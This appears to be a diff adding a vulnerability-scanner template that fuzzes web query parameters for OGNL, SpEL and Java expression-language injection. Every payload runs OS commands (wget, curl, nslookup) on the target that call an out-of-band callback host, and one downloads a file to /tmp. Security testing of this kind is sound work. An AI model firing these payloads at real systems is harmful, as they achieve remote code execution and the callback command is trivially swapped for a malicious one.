@@ -1,0 +1,49 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{ssti}}'
+    mode: multiple
+    part: query
+    type: replace
+  matchers:
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - dns
+    - http
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    ssti:
+    - ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var
+      x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://{{interactsh-url}}\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
+    - ${T(java.lang.Runtime).getRuntime().exec(curl http://{{interactsh-url}})}
+    - spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget
+      http://{{interactsh-url}}/hello -O /tmp/hello")
+    - T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('curl {{interactsh-url}}')
+    - T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('wget {{interactsh-url}}')
+    - T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('nslookup
+      {{interactsh-url}}')
+    - $T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('nslookup
+      {{interactsh-url}}')
+    - ${"".getClass().forName("java.lang".concat("Runtime")).getMethods()[6].invoke("".getClass().forName("java.lang".concat("Runtime"))).exec("nslookup
+      {{interactsh-url}}")}
+    - ${("".getClass()).forName("java.lang".concat("Runtime")).getMethods()[6].invoke(("".getClass()).forName("java.lang".concat("Runtime"))).exec("nslookup
+      {{interactsh-url}}")}
+    - ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("nslookup
+      {{interactsh-url}}")}
+    - ${org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec("nslookup
+      {{interactsh-url}}").getInputStream())}
+    - ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("nslookup
+      {{interactsh-url}}").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
+  stop-at-first-match: true
+id: ognl-ssti-injection-rce
+info:
+  author: reewardius
+  name: OGNL Reflected SSTI RCE Injection
+  reference:
+  - https://www.pwny.cc/web-attacks/server-side-template-injection-ssti
+  severity: critical
+  tags: fuzzing-ssti,fuzzing-rce,fuzzing-req,dast
